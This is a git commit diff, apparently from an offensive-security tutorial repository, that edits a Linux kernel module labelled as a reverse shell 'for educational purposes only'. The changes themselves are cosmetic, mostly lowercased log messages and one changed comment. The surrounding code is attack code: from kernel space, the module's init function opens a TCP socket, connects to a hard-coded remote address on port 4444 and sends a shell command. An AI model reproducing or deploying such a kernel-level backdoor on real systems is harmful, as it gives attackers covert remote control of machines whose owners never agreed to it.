bef92f61eca45621640089db230482ac03fd273c
cocomelonc <cocomelonkz@gmail.com>
2025-04-24 11:54:29 +0300

    test kernel hacking: rev shell

--- 09-linux-android/01-linux-hacking-kernel/hack2.c
+++ 09-linux-android/01-linux-hacking-kernel/hack2.c
@@ -10,7 +10,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("cocomelonc");
-MODULE_DESCRIPTION("Reverse Shell Kernel Module (For Educational Purposes Only)");
+MODULE_DESCRIPTION("reverse shell kernel module (for educational purposes only)");
 
 #define REMOTE_IP "192.168.1.100"  // Replace with the target IP
 #define REMOTE_PORT 4444       // Replace with the target port
@@ -29,7 +29,7 @@ static int __init reverse_shell_init(void) {
   // Create the socket
   ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &client_socket);
   if (ret < 0) {
-    printk(KERN_ERR "Error creating socket\n");
+    printk(KERN_ERR "error creating socket\n");
     return ret;
   }
 
@@ -42,18 +42,18 @@ static int __init reverse_shell_init(void) {
   // Connect to the remote server
   ret = client_socket->ops->connect(client_socket, (struct sockaddr *)&sa, sizeof(sa), 0);
   if (ret < 0) {
-    printk(KERN_ERR "Failed to connect to the server\n");
+    printk(KERN_ERR "failed to connect to the server\n");
     sock_release(client_socket);
     return ret;
   }
 
-  printk(KERN_INFO "Connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);
+  printk(KERN_INFO "connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);
 
   // Prepare the message to send
   iov.iov_base = shell_command;
   iov.iov_len = strlen(shell_command);
 
-  // Create message headers
+  // Initialize msg iter
   msg.msg_name = (struct sockaddr *)&sa;
   msg.msg_namelen = sizeof(sa);
   msg.msg_iter.iov = &iov;
@@ -65,12 +65,12 @@ static int __init reverse_shell_init(void) {
   // Send the shell command
   ret = client_socket->ops->sendmsg(client_socket, &msg, strlen(shell_command));
   if (ret < 0) {
-    printk(KERN_ERR "Failed to send command\n");
+    printk(KERN_ERR "failed to send command\n");
     sock_release(client_socket);
     return ret;
   }
 
-  printk(KERN_INFO "Shell command sent\n");
+  printk(KERN_INFO "shell command sent\n");
 
   return 0;
 }
